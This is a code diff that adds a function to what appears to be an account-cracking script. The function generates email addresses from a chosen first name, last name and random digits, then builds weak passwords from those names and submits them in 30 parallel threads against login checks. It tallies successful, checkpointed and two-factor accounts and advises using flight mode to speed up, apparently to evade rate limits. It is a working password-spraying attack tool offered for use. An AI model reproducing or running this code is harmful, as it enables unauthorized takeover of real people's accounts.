@@ -371,6 +371,62 @@ def ffb(ids,names,passlist):
 	except requests.exceptions.ConnectionError:
 		time.sleep(20)
 	loop+=1
+def gmail():
+                os.system('rm -rf .re.txt')
+                clear()
+                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+                linex()
+                first = input(' Put first name: ')
+                linex()
+                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                linex()
+                last = input(' Put last name: ')
+                linex()
+                print(' Example: @gmail.com , @yahoo.com etc...')
+                linex()
+                domain = input(' domain: ')
+                linex()
+                try:
+                        limit=int(input(' Put limit: '))
+                except ValueError:
+                        limit = 5000
+                linex()
+                print(' Getting gmails...')
+                lists = ['3','4']
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('.re.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as Aking:
+                        total = str(len(fo))
+                        clear()
+                        print(' Total account : \033[1;32m'+total)
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                Aking.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python azeem.py')
+	
 def zee1():
 	os.system('clear')
 	print(logo)
